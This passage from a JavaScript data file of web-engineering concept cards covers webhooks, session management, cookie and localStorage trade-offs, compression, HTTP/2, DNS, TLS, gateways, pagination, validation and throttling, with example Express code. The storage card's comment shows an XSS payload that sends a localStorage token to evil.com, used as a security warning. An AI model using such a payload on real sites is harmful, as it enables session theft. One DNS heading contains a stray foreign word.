    how: "You register a public URL with the provider. On each event it sends a signed POST (HMAC signature header); you verify the signature, check the event ID against replays, process the payload, and return 2xx fast. Slow or failing endpoints trigger retries with exponential backoff.",
    when: "Use them for any provider-driven event: payments, GitHub pushes, Twilio SMS status. Design handlers to be idempotent (retries are guaranteed to duplicate), verify signatures always, and return 200 before doing heavy work — enqueue and process async.",
    ref: "Stripe Documentation",
    subtopics: [
      { name: "Signature verification", detail: "Providers sign the raw body with a shared secret. Verify the HMAC over the EXACT bytes received (not re-serialized JSON) with a timing-safe compare — otherwise anyone can POST you fake events." },
      { name: "At-least-once delivery", detail: "Providers redeliver until you acknowledge. Handlers must be idempotent: store event.id and skip duplicates." },
      { name: "Ack fast, work async", detail: "Return 200 within seconds and push the event to a queue. Providers time out (often 10–30s) and start retrying — slow verification is how double-processing begins." },
      { name: "Reconciliation still needed", detail: "Webhooks get lost sometimes. Periodically pull authoritative state from the provider API and reconcile — webhooks are a shortcut, not the source of truth." },
    ],
    code: `const crypto = require("crypto");

// Verify over the RAW body — mount express.raw() for this route
function verifySignature(rawBody, sigHeader, secret) {
  const parts = Object.fromEntries(
    sigHeader.split(",").map((kv) => kv.split("="))
  ); // t=timestamp,v1=signature
  const expected = crypto
    .createHmac("sha256", secret)
    .update(parts.t + "." + rawBody.toString())
    .digest("hex");
  const a = Buffer.from(expected);
  const b = Buffer.from(parts.v1);
  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) {
    throw new Error("bad signature");
  }
  if (Math.abs(Date.now() / 1000 - Number(parts.t)) > 300) {
    throw new Error("stale timestamp — possible replay");
  }
}

const seen = new Set(); // dedupe store (real impl: DB unique index)

app.post("/webhooks/stripe", express.raw({ type: "application/json" }), (req, res) => {
  try {
    verifySignature(req.body, req.get("stripe-signature"), process.env.STRIPE_WEBHOOK_SECRET);
  } catch {
    return res.status(400).end();
  }
  const event = JSON.parse(req.body);
  if (seen.has(event.id)) return res.status(200).end(); // replay — already handled

  seen.add(event.id);
  queue.enqueue(event);          // ack fast, process async
  res.status(200).end();
});`,
    steps: ["Event occurs upstream", "Provider POSTs to your URL", "Your endpoint receives payload", "You process the event"],
  },
  {
    id: "web-sessionmgmt",
    cat: "web",
    title: "Session Management",
    one: "Tracking a logged-in user across many stateless HTTP requests.",
    why: "HTTP forgets everything between requests, but your app can't ask users to log in on every click. Sessions extend identity across requests — and they're the primary target: session theft is account takeover.",
    how: "On login the server creates a session record (server-side state) and gives the client an opaque, random ID in a cookie. Each request carries the ID; the server looks up the record. Logout deletes it; expiry and rotation limit the blast radius of a stolen ID.",
    when: "Use server-side sessions for browser apps — instant revocation, small cookies, no crypto on the edge. Prefer stateless JWTs for API-to-API or multi-service auth where the issuer can't be hit on every request. Never roll your own session token format; use a CSPRNG for IDs.",
    ref: "OWASP",
    subtopics: [
      { name: "Opaque IDs, server state", detail: "The cookie holds a meaningless random ID; all claims live server-side. Nothing can be forged, and revocation is a single delete." },
      { name: "Secure cookie flags", detail: "HttpOnly + Secure + SameSite=Lax is the baseline. Without HttpOnly, one XSS steals every active session." },
      { name: "Rotation & fixation", detail: "Issue a fresh session ID at every privilege change (login especially) so an attacker-planted pre-auth ID becomes worthless post-auth." },
      { name: "Shared session store", detail: "Sessions in Redis, not process memory — any instance can serve any request, deploys don't log everyone out, and revocation is instant cluster-wide." },
    ],
    code: `const crypto = require("crypto");

// In-memory map shown for clarity — production uses Redis with TTL
const sessions = new Map();

app.post("/login", express.json(), async (req, res) => {
  const user = await verifyCredentials(req.body.email, req.body.password);
  if (!user) return res.status(401).json({ error: { code: "bad_credentials" } });

  const sid = crypto.randomBytes(32).toString("hex"); // opaque, unguessable
  sessions.set(sid, { userId: user.id, createdAt: Date.now(), expiresAt: Date.now() + 86400000 });

  res.cookie("sid", sid, { httpOnly: true, secure: true, sameSite: "lax" });
  res.json({ data: { id: user.id } });
});

// Middleware: every protected request resolves identity from the cookie
function requireSession(req, res, next) {
  const sid = req.cookies.sid;
  const session = sid && sessions.get(sid);
  if (!session || Date.now() > session.expiresAt) {
    sessions.delete(sid);
    return res.status(401).json({ error: { code: "session_expired" } });
  }
  req.userId = session.userId;
  next();
}

app.post("/logout", requireSession, (req, res) => {
  sessions.delete(req.cookies.sid);            // instant, server-side revocation
  res.clearCookie("sid");
  res.status(204).end();
});`,
    steps: ["Login succeeds", "Session stored server-side", "ID sent as cookie", "Lookup on each request"],
  },
  {
    id: "web-storage",
    cat: "web",
    title: "Cookies vs Local Storage",
    one: "Where and how data persists in the browser, and who can read it.",
    why: "Where you store a token decides your attack surface: localStorage tokens are one XSS away from total account takeover, while HttpOnly cookies are invisible to scripts but introduce CSRF. Choosing without knowing the trade-off is how breaches happen.",
    how: "Cookies are key-value pairs the browser attaches automatically to matching requests (domain, path, expiry rules). localStorage is a JS-only key-value store per origin — larger capacity, never sent to the server, readable by any script on the page.",
    when: "Server sessions and auth for browser apps: HttpOnly cookies (scripts can't touch them). Non-sensitive preferences, UI state, cached payloads: localStorage. Never store tokens, secrets, or personal data in localStorage on an app that renders user content.",
    ref: "MDN Web Docs",
    subtopics: [
      { name: "Automatic vs explicit", detail: "Cookies ride along on every matching request (that's why CSRF exists); localStorage moves only when your code reads it and puts it in a header." },
      { name: "Capacity & expiry", detail: "~4KB per cookie vs ~5–10MB per origin for localStorage. Cookies expire by Max-Age; localStorage persists until JS clears it." },
      { name: "XSS math", detail: "Steal a localStorage token: one injected script, fetch, done — persists beyond the session. HttpOnly cookie theft requires a far harder server-side breach." },
      { name: "If you must store tokens client-side", detail: "in-memory only (lost on refresh) plus a refresh-token cookie rotation flow. Accept the complexity or switch to cookies." },
    ],
    code: `// COOKIE route: server sets it, browser auto-sends it, JS can't read it
app.post("/auth/login", async (req, res) => {
  const token = await issueToken(req.body);
  res.cookie("access", token, { httpOnly: true, secure: true, sameSite: "lax" });
  res.sendStatus(204);
});
// Every later request carries the cookie automatically:
// fetch("/api/me", { credentials: "same-origin" })

// LOCAL STORAGE: convenient, fully exposed to any script
localStorage.setItem("theme", "dark");            // fine — non-sensitive
localStorage.setItem("token", jwt);               // DON'T — readable via one XSS

// What an attacker needs to ruin your day if the token is in localStorage:
// <img onerror="fetch('https://evil.com?t='+localStorage.token)" src=x>

// Reading storage safely for non-sensitive data
function loadPrefs() {
  try {
    return JSON.parse(localStorage.getItem("prefs")) ?? {};
  } catch {
    return {}; // corrupted or absent — degrade gracefully
  }
}`,
    steps: ["Cookie: sent every request", "Local storage: JS-only, not sent", "Choose by need", "Persist accordingly"],
  },
  {
    id: "web-compression",
    cat: "web",
    title: "Compression (gzip/brotli)",
    one: "Shrinking response payloads before they travel over the network.",
    why: "JSON is extremely repetitive text — a 500KB API response typically compresses to 60–100KB. On slow mobile links that's the difference between a snappy and a sluggish app, for one middleware line of server cost.",
    how: "The server compresses the body with gzip or Brotli (Brotli: ~15–20% smaller, slower) and sets Content-Encoding. The client advertises support via Accept-Encoding and decompresses transparently. Text formats shine; already-compressed content (images, WOFF2) is skipped.",
    when: "Enable for all text responses (JSON, HTML, SVG, JS, CSS) — ideally precompressed at build time with Brotli for static assets, dynamic gzip at the proxy for APIs. Skip for images, videos, and tiny responses where overhead exceeds savings. Always keep compression OFF for secrets in close quarters (BREACH attacks on CSRF tokens inline).",
    ref: "MDN Web Docs",
    subtopics: [
      { name: "Negotiation", detail: "Client sends Accept-Encoding: gzip, br; server picks one and declares Content-Encoding. Mismatch = broken bytes, so this pair must stay consistent through proxies." },
      { name: "Static vs dynamic", detail: "Precompress assets at build (best ratio, zero runtime CPU); compress dynamic responses on the fly with a size floor (~1KB) — compressing 200 bytes costs more than it saves." },
      { name: "Levels are a dial", detail: "gzip -1 is fast and weak, -9 small and slow. API servers run 4–6; build-time assets can afford maximum Brotli." },
      { name: "BREACH caveat", detail: "Compressing pages that embed secrets AND reflect attacker input lets attackers guess secrets byte-by-byte. Don't compress authenticated pages containing CSRF tokens with user-reflected content." },
    ],
    code: `const zlib = require("zlib");

// Dynamic compression middleware with a size floor
function compress(req, res, next) {
  const originalWrite = res.write.bind(res);
  const originalEnd = res.end.bind(res);
  const chunks = [];
  let useCompression = false;

  res.write = (chunk, ...args) => {
    chunks.push(Buffer.from(chunk));
    return true;
  };
  res.end = (chunk, ...args) => {
    if (chunk) chunks.push(Buffer.from(chunk));
    const body = Buffer.concat(chunks);
    const accepts = String(req.headers["accept-encoding"] ?? "");
    const type = String(res.getHeader("Content-Type") ?? "");

    if (body.length > 1024 && accepts.includes("gzip") && type.startsWith("text/")) {
      useCompression = true;
      res.setHeader("Content-Encoding", "gzip");
      res.setHeader("Vary", "Accept-Encoding");
      res.removeHeader("Content-Length");
      originalEnd(zlib.gzipSync(body, { level: 6 }), ...args);
    } else {
      originalEnd(body, ...args);
    }
  };
  next();
}

// Static assets: serve files precompressed at build time — zero runtime CPU
// app.use(express.static("dist", { setHeaders: (res, path) => {
//   if (fs.existsSync(path + ".br")) res.setHeader("Content-Encoding", "br");
// }}));`,
    steps: ["Server compresses body", "Header notes encoding", "Client receives smaller payload", "Browser decompresses"],
  },
  {
    id: "web-http2",
    cat: "web",
    title: "HTTP/2 & HTTP/3",
    one: "Multiplexed streams over one connection cut the latency HTTP/1.1 suffered from.",
    why: "HTTP/1.1 allows one outstanding request per connection, so browsers open six+ and still queue — head-of-line blocking at the HTTP level. HTTP/2 multiplexes many streams over one connection; HTTP/3 moves to QUIC over UDP and removes TCP-level blocking too.",
    how: "HTTP/2 frames requests into numbered binary streams sharing one TCP connection, with header compression (HPACK) and prioritization. HTTP/3 (QUIC) replaces TCP with UDP streams, so a dropped packet stalls only its own stream, and handshakes are 1-RTT (0-RTT on resume).",
    when: "Enable h2/h3 at the edge — it's a TLS-terminator toggle, not application work. Gains are largest for many-small-asset pages and high-latency mobile clients. Keep optimizing payload size: multiplexing doesn't shrink bytes, it unblocks parallelism.",
    ref: "MDN Web Docs",
    subtopics: [
      { name: "Multiplexing", detail: "Interleaved streams over one connection: no more domain sharding or sprite sheets — those hacks existed solely to dodge HTTP/1.1 queuing." },
      { name: "HPACK header compression", detail: "Repeated headers (cookies, user-agent) are indexed once, not resent — big win when every request carries 2KB of cookies." },
      { name: "QUIC & 0-RTT", detail: "HTTP/3's UDP transport merges transport+TLS handshake, and resumed connections can send data in the first flight — materially faster mobile reconnects." },
      { name: "It's all TLS now", detail: "Every major browser requires HTTPS for h2/h3. Certificate management becomes part of the performance story." },
    ],
    code: `const http2 = require("http2");
const fs = require("fs");

// One connection, many parallel streams — no queuing per resource
const server = http2.createSecureServer({
  key: fs.readFileSync("key.pem"),
  cert: fs.readFileSync("cert.pem"),
});

server.on("stream", (stream, headers) => {
  const path = headers[":path"];
  stream.respond({ "content-type": "application/json", ":status": 200 });
  stream.end(JSON.stringify({ path, note: "delivered on an h2 stream" }));
});

server.on("session", (session) => {
  session.settings({ enablePush: false }); // push is deprecated — preload/prefetch instead
});

server.listen(8443);

// Client smoke test
const client = http2.connect("https://localhost:8443");
const req = client.request({ ":path": "/orders" });
req.on("response", (h) => console.log("status:", h[":status"]));
req.on("data", (c) => process.stdout.write(c));
req.on("end", () => client.close());`,
    steps: ["Single connection opened", "Multiple streams multiplexed", "Requests interleaved", "No head-of-line blocking"],
  },
  {
    id: "web-dns",
    cat: "web",
    title: "DNS Resolution",
    one: "Translating a domain name into an IP address before a request can be sent.",
    why: "Every external request starts with a name lookup — and a cold DNS lookup costs 20–500ms before any TCP/TLS work begins. DNS misconfiguration is a silent latency tax and a classic outage source (expired records, slow nameservers).",
    how: "The resolver walks a hierarchy: root servers point to TLD servers (.com), which point to the domain's authoritative nameservers, which return the record. Results cache at every layer governed by TTL — a 300s TTL means at most 5 minutes of staleness after a change.",
    when: "Set realistic TTLs: low (60–300s) for things that must fail over fast (your app's A/ALIAS records), high (3600s+) for stable infrastructure. Use DNS-level failover or weighted records for multi-region routing, and never point a CNAME chain at slow nameservers.",
    ref: "Cloudflare Learning Center",
    subtopics: [
      { name: "Record types", detail: "A (IPv4), AAAA (IPv6), CNAME (alias to another name — not allowed at zone apex), ALIAS/ANAME (apex workaround), MX (mail), TXT (verification, SPF)." },
      { name: "TTL is a承诺", detail: "Every cache from the OS to ISP resolvers honors TTL — set it BEFORE you need to move fast. Dropping TTL the day of a migration is weeks too late." },
      { name: "Propagation myth", detail: "Nothing 'propagates' — caches simply expire per TTL. With a 300s TTL, the world is on new records within ~5 minutes; with 86,400s, up to a day." },
      { name: "Resolution path", detail: "Stub resolver (your OS) → recursive resolver (ISP/1.1.1.1) → root → TLD → authoritative. Each step adds latency, each caches the answer." },
    ],
    code: `const dns = require("dns").promises;

// What the machine sees before it can open a connection
async function trace(domain) {
  const start = Date.now();
  const [addresses, cname] = await Promise.all([
    dns.resolve4(domain),                    // A records
    dns.resolveCname(domain).catch(() => []), // aliases, if any
  ]);
  console.log(JSON.stringify({
    domain,
    addresses,
    cname,
    lookupMs: Date.now() - start,            // this cost is paid before TLS even starts
  }));
}
trace("api.example.com");

// Preflush DNS in HTML to pay the lookup during idle time:
// <link rel="dns-prefetch" href="https://api.example.com">
// <link rel="preconnect" href="https://api.example.com" crossorigin>

// Health-check style failover: swap A records when a region dies (via provider API)
async function failover(zone, recordId, toIp) {
  await provider.updateRecord(zone, recordId, { type: "A", value: toIp, ttl: 60 });
  console.log("traffic moving to", toIp, "— full effect within 60s TTL");
}`,
    steps: ["Browser needs IP", "Query DNS resolver", "Resolver returns IP", "Connection opens to IP"],
  },
  {
    id: "web-tls",
    cat: "web",
    title: "TLS Handshake",
    one: "Client and server agree on encryption keys before any data is exchanged.",
    why: "Plain HTTP is a postcard — every router, proxy, and Wi-Fi snooper reads and rewrites it. TLS turns it into a sealed envelope with a tamper seal: confidentiality, integrity, and (via certificates) proof you're talking to the real server.",
    how: "Client hello offers cipher suites; server hello picks one and presents its certificate chain, which the client validates against trusted CAs. Key agreement (ECDHE) produces a shared secret without transmitting it; both sides derive session keys and switch to encrypted records. TLS 1.3 does this in ONE round trip.",
    when: "TLS everywhere — no exceptions on internal traffic (lateral movement is how breaches spread). Terminate at the load balancer for public traffic, but re-encrypt to services (mTLS for service-to-service in zero-trust setups). Rotate certificates automatically (ACME/Let's Encrypt) before expiry ruins a weekend.",
    ref: "Cloudflare Learning Center",
    subtopics: [
      { name: "Certificates & the CA web", detail: "A cert binds a domain to a public key, signed by a CA your OS/browser already trusts. Chain validation is what stops api.bank.com impersonation." },
      { name: "Ephemeral keys (ECDHE)", detail: "Each session gets fresh key agreement — captured traffic can't be decrypted later even if the server's private key leaks (forward secrecy)." },
      { name: "TLS 1.2 vs 1.3", detail: "1.2 needs 2 round trips and legacy ciphers; 1.3 cut to 1 round trip with only modern AEAD ciphers. Disable 1.0/1.1 everywhere." },
      { name: "HSTS pins it", detail: "Strict-Transport-Security makes browsers refuse plain HTTP for your domain forever — kills SSL-stripping attacks on public Wi-Fi." },
    ],
    code: `const https = require("https");
const fs = require("fs");

const server = https.createServer(
  {
    key: fs.readFileSync("privkey.pem"),
    cert: fs.readFileSync("fullchain.pem"),   // leaf + intermediates
    minVersion: "TLSv1.2",                    // refuse legacy clients
    honorCipherOrder: true,
  },
  (req, res) => res.end("encrypted")
);
server.listen(443);

// Force HTTPS + HSTS in the plain-HTTP redirector
http
  .createServer((req, res) => {
    res.writeHead(301, {
      Location: "https://" + req.headers.host + req.url,
      // after the first visit, browsers refuse http:// for 2 years:
      "Strict-Transport-Security": "max-age=63072000; includeSubDomains; preload",
    });
    res.end();
  })
  .listen(80);`,
    steps: ["Client hello", "Server presents certificate", "Keys exchanged", "Encrypted channel established"],
  },
  {
    id: "web-apigateway",
    cat: "web",
    title: "API Gateway",
    one: "A single entry point that routes, authenticates, and rate-limits requests to backend services.",
    why: "Ten microservices each re-implementing auth, rate limiting, and TLS is ten places to get it wrong. The gateway centralizes cross-cutting concerns once, hides internal topology, and gives clients one stable door to knock on.",
    how: "Clients hit the gateway; it authenticates (validates JWT/API keys), enforces limits, applies routing rules (path/header → service), then proxies. It can also aggregate, transform, log, and terminate TLS. Services stay focused on business logic.",
    when: "Add a gateway when you have multiple services or external consumers — managed (AWS API Gateway, Cloudflare) or self-hosted (Kong, Envoy, Express Gateway). Skip it for a single-service app: a reverse proxy (nginx) already covers TLS and routing without the extra hop.",
    ref: "AWS Documentation",
    subtopics: [
      { name: "Cross-cutting once", detail: "Auth, rate limits, request ID injection, and response headers live in one audited place instead of copy-pasted middleware in every service." },
      { name: "Routing & abstraction", detail: "Clients see /orders; internally it may be orders-v2 today, orders-v3 tomorrow. Renames, splits, and migrations happen without touching any client." },
      { name: "The blast radius", detail: "The gateway is a single point of failure and a latency tax (~2–10ms). Deploy it redundantly and keep its config under version control." },
      { name: "Gateway vs service mesh", detail: "North-south (client in) traffic is the gateway's job; east-west (service-to-service) belongs to a mesh. Big systems end up with both." },
    ],
    code: `// A minimal gateway: auth -> rate limit -> route -> proxy
const rateBuckets = new Map(); // ip -> { tokens, updatedAt }

function rateLimit(req, res, next) {
  const key = req.ip;
  const now = Date.now();
  const bucket = rateBuckets.get(key) ?? { tokens: 60, updatedAt: now };
  bucket.tokens = Math.min(60, bucket.tokens + ((now - bucket.updatedAt) / 1000) * 1); // 1/s refill
  bucket.updatedAt = now;
  if (bucket.tokens < 1) {
    res.set("Retry-After", "1");
    return res.status(429).json({ error: { code: "rate_limited" } });
  }
  bucket.tokens -= 1;
  rateBuckets.set(key, bucket);
  next();
}

const routes = [
  { prefix: "/orders", target: "http://orders.internal:8000" },
  { prefix: "/users", target: "http://users.internal:8001" },
];

app.use(rateLimit);
app.use(async (req, res, next) => {
  const route = routes.find((r) => req.path.startsWith(r.prefix));
  if (!route) return res.status(404).json({ error: { code: "no_route" } });

  const jwtPayload = await verifyJwt(req.get("authorization")); // auth once, here
  req.headers["x-user-id"] = jwtPayload?.sub ?? "anonymous";    // identity downstream

  proxy.web(req, res, { target: route.target });                // forward
});`,
    steps: ["Client request", "Gateway authenticates", "Routes to service", "Aggregates response"],
  },
  {
    id: "web-pagination",
    cat: "web",
    title: "Pagination",
    one: "Splitting a large result set into pages instead of returning everything at once.",
    why: "An endpoint that returns 2M rows one day will take down a mobile client, a browser, and the database together. Pagination bounds every response to a predictable size — it's not a feature, it's a stability requirement.",
    how: "Offset pagination (LIMIT/OFFSET) is simple but slow on deep pages and shifts rows when data changes underneath. Cursor pagination returns an opaque pointer (the last item's id/timestamp); the next query resumes 'after' it — stable, index-fast, order-guaranteed.",
    when: "Default to cursor pagination for anything user-facing and scrollable (feeds, inboxes, search results). Offset is fine for small admin tables with page numbers. Always cap page size server-side regardless of what the client requests.",
    ref: "Stripe API Documentation",
    subtopics: [
      { name: "Cursor mechanics", detail: "WHERE (created_at, id) < (last_seen_created_at, last_seen_id) ORDER BY created_at DESC, id DESC — the tuple comparison makes it index-friendly and tie-proof." },
      { name: "Offset's deep-page tax", detail: "OFFSET 100000 still reads 100050 rows to throw 100000 away — page 5000 gets slower than page 1. Cursors stay fast at any depth." },
      { name: "Opaque cursors", detail: "Base64-encode the pointer so clients treat it as a token, not a contract you can never change internally." },
      { name: "Has-more instead of totals", detail: "COUNT(*) on huge tables is its own query cost. Request page_size + 1 and drop the extra row to know whether a next page exists." },
    ],
    code: `// GET /v1/orders?limit=20&cursor=eyJpZCI6Im9yZF85In0=
function encodeCursor(order) {
  return Buffer.from(JSON.stringify({ id: order.id, ts: order.createdAt })).toString("base64url");
}
function decodeCursor(cursor) {
  return cursor ? JSON.parse(Buffer.from(cursor, "base64url").toString()) : null;
}

app.get("/v1/orders", async (req, res) => {
  const limit = Math.min(Number(req.query.limit) || 20, 100); // server-side cap
  const cursor = decodeCursor(req.query.cursor);

  // tuple predicate: index-friendly, immune to concurrent inserts shifting pages
  const rows = await pool.query(
    cursor
      ? "select * from orders where (created_at, id) < ($1, $2) order by created_at desc, id desc limit $3"
      : "select * from orders order by created_at desc, id desc limit $1",
    cursor ? [cursor.ts, cursor.id, limit + 1] : [limit + 1]
  );

  const hasMore = rows.rowCount > limit;
  const page = rows.rows.slice(0, limit);      // fetch N+1, return N
  res.json({
    data: page,
    nextCursor: hasMore ? encodeCursor(page[page.length - 1]) : null,
  });
});`,
    steps: ["Full result set", "Split into pages", "Client requests page N", "Server returns slice"],
  },
  {
    id: "web-inputvalidation",
    cat: "web",
    title: "Request Validation",
    one: "Checking every incoming payload's shape and values before it reaches business logic.",
    why: "Every handler that trusts input is an injection, type-confusion, or logic bug waiting to happen — attackers send shapes you never imagined. A validation gate at the edge rejects garbage once, so every downstream line of code can assume clean data.",
    how: "Declare a schema per endpoint (field types, required, ranges, formats, enums). Parse the request against it; on failure return 400/422 with field-level errors; on success hand over typed, normalized data. Coercion happens once at the edge ('5' → 5), never deep inside business logic.",
    when: "Validate everything that crosses a trust boundary: HTTP bodies, query params, headers, queue messages, webhook payloads, env vars at boot. Be strict on types and required fields, explicit about limits (string lengths, array sizes, numbers) — limits are what stop resource-exhaustion bugs.",
    ref: "OWASP",
    subtopics: [
      { name: "Schema-first validation", detail: "zod/ajv/joi schemas are executable documentation: one declaration yields runtime checks, error messages, and (with TS) inferred types." },
      { name: "Validate, then sanitize", detail: "Validation decides accept/reject; sanitization cleans values you accept (trim, strip tags, normalize email). Confusing them is how invalid data sneaks through 'cleaned'." },
      { name: "Allowlists beat blocklists", detail: "Reject anything not explicitly permitted. Blocklists always miss the tenth weird encoding of <script> that allowlists never let in." },
      { name: "Size and rate are validation", detail: "Cap body size, string length, array cardinality, and nesting depth — malformed monsters like 10MB-deep JSON are DoS via the parser." },
    ],
    code: `const { z } = require("zod");

// Declarative contract per endpoint
const CreateOrderSchema = z.object({
  userId: z.string().uuid(),
  items: z
    .array(
      z.object({
        productId: z.string().min(1).max(64),
        qty: z.number().int().min(1).max(99),
      })
    )
    .min(1)
    .max(50),                      // cardinality limits stop abuse, not just bugs
  coupon: z.string().regex(/^[A-Z0-9]{4,12}$/).optional(),
});

app.post("/v1/orders", express.json({ limit: "16kb" }), (req, res) => {
  const parsed = CreateOrderSchema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(422).json({
      error: {
        code: "validation_failed",
        details: parsed.error.issues.map((i) => ({ path: i.path.join("."), message: i.message })),
      },
    });
  }

  const order = parsed.data; // typed, bounded, normalized — safe downstream
  // every handler below can now assume: real uuid, <=50 items, qty 1-99
  res.status(201).json({ data: orders.create(order) });
});`,
    steps: ["Request arrives", "Schema validated", "Reject if invalid", "Pass through if valid"],
  },
  {
    id: "web-throttling",
    cat: "web",
    title: "API Throttling",
    one: "Slowing clients that exceed their allotted request rate rather than rejecting outright.",
    why: "A hard 429 wall is honest but hostile — batch jobs fail, mobile apps show errors, one noisy partner chokes. Throttling degrades gracefully: extra requests wait briefly (queue) or shed only the excess, keeping the system inside capacity while users barely notice.",
    how: "Measure per-client consumption (token bucket / sliding window in a shared store). Under the limit: pass. Over it: either delay the request until a token frees up (throttle) or reject with 429 + Retry-After (limit). Real systems throttle the slight excess and limit the gross excess.",
    when: "Throttle friendly, retryable traffic (polling clients, batch exports) and hard-limit abusive or unauthenticated traffic. Expose the state: X-RateLimit-Remaining and Retry-After headers turn a mysterious stall into a cooperative contract.",
    ref: "Stripe API Documentation",
    subtopics: [
      { name: "Limit vs throttle", detail: "Limiting rejects instantly (429); throttling delays. Clients with timeouts turn long throttles into failures anyway — so bound the wait." },
      { name: "Shed the newest", detail: "When queues back up, refusing NEW requests while finishing old ones (load-shed) beats making everyone wait — plus 'server busy' errors are more honest than 30s stalls." },
      { name: "Tell the client", detail: "X-RateLimit-Limit/Remaining/Reset headers let well-behaved clients self-regulate and never see a 429." },
      { name: "Tiered limits", detail: "Separate buckets for expensive endpoints (exports, searches) vs cheap ones (reads) — one heavy call shouldn't consume the budget needed for normal browsing." },
    ],
    code: `const buckets = new Map(); // clientId -> tokens (real impl: Redis INCR/EXPIRE)

function throttle({ capacity = 20, refillPerSec = 5, maxDelayMs = 2000 }) {
  return (req, res, next) => {
    const key = req.user?.id ?? req.ip;
    const now = Date.now();
    const b = buckets.get(key) ?? { tokens: capacity, ts: now };
    b.tokens = Math.min(capacity, b.tokens + ((now - b.ts) / 1000) * refillPerSec);
    b.ts = now;

    if (b.tokens >= 1) {
      b.tokens -= 1;
      buckets.set(key, b);
      res.set("X-RateLimit-Remaining", Math.floor(b.tokens));
      return next();                       // under limit: pass straight through
    }

    // over limit: wait just long enough for one token — but only briefly
    const waitMs = Math.min(((1 - b.tokens) / refillPerSec) * 1000, maxDelayMs);
    if (waitMs < maxDelayMs) {
      buckets.set(key, { ...b, tokens: b.tokens + 1 });
      res.set("X-RateLimit-Remaining", "0");
      return setTimeout(next, waitMs);     // throttled, then served
    }

    res.set("Retry-After", String(Math.ceil(waitMs / 1000)));
    res.status(429).json({ error: { code: "rate_limited" } }); // gross excess: reject
  };
}

app.use("/v1", throttle({ capacity: 20, refillPerSec: 5 }));`,
    steps: ["Requests tracked per client", "Limit exceeded", "Response delayed or queued", "Rate resumes next window"],
  },
];